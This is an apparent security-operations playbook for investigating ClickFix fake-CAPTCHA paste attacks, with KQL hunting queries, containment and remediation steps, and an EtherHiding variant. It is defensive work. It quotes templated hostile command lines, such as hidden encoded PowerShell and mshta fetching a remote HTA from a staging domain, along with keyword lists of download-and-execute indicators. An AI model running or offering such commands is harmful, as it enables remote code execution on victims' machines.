# ClickFix — investigation

## What is ClickFix?

A social engineering technique that skips the file entirely. The victim lands on a compromised or malicious site showing a fake CAPTCHA, "verify you're human" check, or a browser/driver "error" that needs fixing. A script on the page silently copies an attacker-controlled command to the clipboard, then the page tells the user exactly how to run it:

```
Press Win + R, press Ctrl + V, press Enter
```

or, in newer variants, "open PowerShell (Admin) and paste this to fix the issue." The user pastes the command themselves and presses Enter. No file is downloaded, no attachment is opened — the user is the delivery mechanism and the execution mechanism.

> The email gateway never saw a file. The download protection never saw a file. There was never a file to see — the payload lived in the clipboard and the user's own hands did the rest.

**Why it bypasses the usual controls:**
- No attachment, no download — email/web attachment scanning and Safe Attachments have nothing to inspect
- No file written to disk until *after* a legitimate, signed Windows binary (`powershell.exe`, `mshta.exe`, `cmd.exe`) is already running — AV/EDR file-reputation checks that gate on write events are already behind
- The process spawning the LOLBin is `explorer.exe` (Run dialog) or the browser itself — both are expected, everyday parents, so naive parent/child allowlisting doesn't flag it
- It relies on the user typing nothing and reading nothing carefully — Ctrl+V and Enter is the entire attack surface

---

## Detection — process tree signature

Look for a LOLBin appearing where it normally wouldn't, immediately downstream of user interaction with a browser:

```
explorer.exe → powershell.exe -w hidden -enc <base64>
explorer.exe → mshta.exe http://<staging-domain>/verify.hta
explorer.exe → cmd.exe /c powershell -nop -w hidden -c "..."
chrome.exe / msedge.exe → mshta.exe / powershell.exe   (protocol-handler variants)
```

**Red flags on the command line:** `-enc` / `-EncodedCommand`, `-w hidden` / `-windowstyle hidden`, `-nop` / `-noprofile`, `IEX`, `Invoke-Expression`, `DownloadString`, `FromBase64String`, an `mshta.exe` invocation with a URL argument, or any of the above fired within a few minutes of the same user's browser process being active.

The parent alone isn't the whole signal — `explorer.exe` spawning `powershell.exe` happens legitimately too. What makes it ClickFix is the *combination*: an unexpected LOLBin, an obfuscated/hidden command line, and a browser session active on the same device moments earlier. See [clickfix-lolbin-from-browser-explorer.kql](../../../kql/process/clickfix-lolbin-from-browser-explorer.kql) — it joins the LOLBin execution back to the nearest preceding browser process on the same device.

```kql
// ClickFix — LOLBin spawned from explorer.exe (Run dialog) or a browser
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// MITRE: T1204.004
// Looks for an encoded/hidden command line, joined back to the nearest preceding browser process
// on the same device
// Covers: powershell.exe, mshta.exe, cmd.exe launched as if a user pasted a fake CAPTCHA /
//   "verify you're human" command into Win+R or a terminal
// A LOLBin alone from explorer.exe isn't unusual — the browser correlation within 5 minutes
// is what separates ClickFix from routine admin activity
// Ref: docs/scenarios/13-clickfix/investigation.md

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
let LOLBinExec = DeviceProcessEvents
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where FileName in~ ("powershell.exe", "pwsh.exe", "mshta.exe", "cmd.exe")
| where InitiatingProcessFileName in~ (
    "explorer.exe", "chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
| where ProcessCommandLine has_any (
    "-enc", "-EncodedCommand", "-w hidden", "-windowstyle hidden",
    "-nop", "-noprofile", "IEX", "Invoke-Expression",
    "DownloadString", "FromBase64String", "mshta")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessId;
let BrowserActivity = DeviceProcessEvents
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where FileName in~ ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
| project BrowserTimestamp = Timestamp, DeviceName, BrowserProcess = FileName;
LOLBinExec
| join kind=leftouter BrowserActivity on DeviceName
| where isempty(BrowserProcess) or BrowserTimestamp between ((Timestamp - 5m) .. Timestamp)
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessId, BrowserProcess, BrowserTimestamp
| order by Timestamp desc
```

---

## Containment

- **Isolate the device** — the LOLBin may already have downloaded and executed a second-stage payload; don't wait for confirmation
- **Disable or suspend the account** used at the time — the same clipboard prompt often also harvests credentials on the same page before showing the paste instructions
- **Do not rely on AV alone to clear this.** The initial execution is fileless and uses a signed Microsoft binary — most AV engines have nothing to flag until a payload is written to disk, and by then persistence may already be in place. Treat "AV shows no detection" as inconclusive, not as all-clear

---

## Investigation / scoping steps

Work through these in order:

### a. Confirm the execution chain

Pull the process tree around the alert timestamp — parent, the LOLBin, and anything the LOLBin subsequently spawned.

```kql
// 13 — process tree around the alert
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceProcessEvents
| where DeviceName startswith "HOSTNAME"
| where Timestamp between ((T0 - 10m) .. (T0 + 30m))
| project Timestamp, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

### b. Confirm network callout to the malicious URL/domain

Confirm the LOLBin actually reached out — not every paste succeeds (typos, the page going down, EDR network blocking). See [clickfix-callout-correlation.kql](../../../kql/network/clickfix-callout-correlation.kql).

```kql
// 13 — callouts from this device to the malicious domain
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
let MaliciousDomain = "SUSPICIOUS_DOMAIN_HERE";
DeviceNetworkEvents
| where DeviceName startswith "HOSTNAME"
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| where RemoteUrl has MaliciousDomain
| project Timestamp, InitiatingProcessFileName, InitiatingProcessCommandLine,
    RemoteUrl, RemoteIP, RemotePort
```

### c. Hunt the same URL/domain/IOC tenant-wide

One user pasting a command rarely means one user was targeted — the same lure is usually served to everyone who lands on the compromised page. Sweep process, network, URL-click, and email-URL telemetry for the same IOC. See [clickfix-tenant-wide-ioc-hunt.kql](../../../kql/network/clickfix-tenant-wide-ioc-hunt.kql).

### d. Check for dropped payloads / persistence

```kql
// 13 — files dropped in user-writable paths
// Runs in: Defender XDR Advanced Hunting (also works in Sentinel when the table is streamed)
// Replace HOSTNAME with the short device name (e.g. PC01); startswith matches the FQDN, case-insensitive

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
DeviceFileEvents
| where DeviceName startswith "HOSTNAME"
| where FolderPath has_any ("\\Temp\\", "\\AppData\\", "\\ProgramData\\")
| where Timestamp between ((T0 - 24h) .. (T0 + 24h))
| project Timestamp, FileName, FolderPath, SHA1, SHA256, InitiatingProcessFileName
```

Also check scheduled tasks and Run keys — see [scheduled-task-creation.kql](../../../kql/persistence/scheduled-task-creation.kql) and [registry-run-key-modifications.kql](../../../kql/persistence/registry-run-key-modifications.kql).

### e. Check identity impact

Many ClickFix lures sit on a page that also harvested credentials before showing the paste step. Check sign-in logs for the affected user around and after the incident, and revoke tokens if there's any doubt.

```kql
// 13 — sign-ins for the affected user around and after the incident
// Runs in: Sentinel only

// REPLACE: incident time (T0, UTC) on the next line before running
let T0 = datetime(PASTE_TIME_UTC);
union SigninLogs, AADNonInteractiveUserSignInLogs
| where UserPrincipalName =~ "USERNAME"
| where TimeGenerated between ((T0 - 24h) .. (T0 + 24h))
| project TimeGenerated, AppDisplayName, IPAddress, ResultType, Type
| order by TimeGenerated desc
```

> If credential harvest can't be ruled out, revoke refresh tokens for the account (Entra ID → user → Revoke sessions) — don't wait for a confirmed password change.

### f. Special case — EtherHiding (compromised legitimate site, not phishing)

If the lure was served from a **legitimate, otherwise-trusted website that's been compromised** (rather than a phishing email or a purpose-built scam domain), check whether the payload was staged via **EtherHiding** — malicious JavaScript/commands read from a smart contract on a public blockchain (BSC/EVM) via an `eth_call`, instead of being fetched from a traditional C2 domain.

**Why this matters for scoping:** the C2 indicator in an EtherHiding case is a **smart contract address plus an RPC endpoint host** (e.g. `bsc-dataseed.binance.org`, or any public Infura/Alchemy/Ankr RPC gateway), not a domain the attacker registered. It will not appear in domain reputation feeds or blocklists, the contract can be updated post-compromise without changing any network indicator you'd normally hunt on, and the RPC host itself is legitimate shared infrastructure you can't block wholesale. Treat a non-browser process (PowerShell, mshta, a script host) making outbound calls to a known blockchain RPC endpoint as a strong signal, and pivot your IOC hunt to the contract address once identified rather than a domain. See [clickfix-etherhiding-rpc-callout.kql](../../../kql/network/clickfix-etherhiding-rpc-callout.kql).

---

## Remediation

- Reset credentials for any account active on the device at the time
- Revoke sessions / refresh tokens for that account
- Reimage the device if unauthorized code execution is confirmed — don't attempt to "clean" a device that ran an unknown payload with unknown persistence
- Submit the lure domain, staging URL, and (for EtherHiding) the RPC host + contract address to the threat intel watchlist so the tenant-wide hunt and future detections pick it up

---

## MITRE ATT&CK mapping

| Technique | ID |
|-----------|-----|
| User execution — malicious copy/paste | T1204.004 |
| PowerShell | T1059.001 |
| Application layer protocol — web | T1071.001 |
| Web service (EtherHiding C2 variant) | T1102 |

Full detail in [MITRE-mapping.md](../../../MITRE-mapping.md).
